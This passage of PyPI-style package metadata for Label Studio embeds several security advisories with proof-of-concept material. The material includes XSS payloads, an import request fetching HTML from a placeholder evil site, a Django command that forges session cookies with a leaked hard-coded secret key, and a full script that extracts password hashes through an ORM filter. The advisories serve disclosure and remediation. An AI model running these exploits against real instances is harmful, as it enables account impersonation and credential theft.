according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.0.2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.0.2/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (==19.1.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.4)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (==0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (==0.0.28)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","moto (==1.3.16.dev122)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.0.2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"771c4d1387246323ef553b681d9b3a313430feb97dfb35efe0d0db03b9085d4f","md5":"95d6e69923edf0830289d342b81db43f","sha256":"841d9f34eafd900f6c964ed2afac7c75b42af8ad89bb3d2535eb05c1810a1702"},"downloads":-1,"filename":"label_studio-1.0.2-py3-none-any.whl","has_sig":false,"md5_digest":"95d6e69923edf0830289d342b81db43f","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":48019301,"upload_time":"2021-05-19T17:13:27","upload_time_iso_8601":"2021-05-19T17:13:27.191129Z","url":"https://files.pythonhosted.org/packages/77/1c/4d1387246323ef553b681d9b3a313430feb97dfb35efe0d0db03b9085d4f/label_studio-1.0.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"02e68b8e821ebeb3b2beedc3990dfcb7b39b69304607724ae473bc4e403965d5","md5":"ca7c513f9556e7015a3b5502122780fe","sha256":"9f56eaa3cc3577d5f42a78339f3b92cd2cfec43d3c2691121dfdbb3bd1f9214e"},"downloads":-1,"filename":"label-studio-1.0.2.tar.gz","has_sig":false,"md5_digest":"ca7c513f9556e7015a3b5502122780fe","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":47203748,"upload_time":"2021-05-19T17:1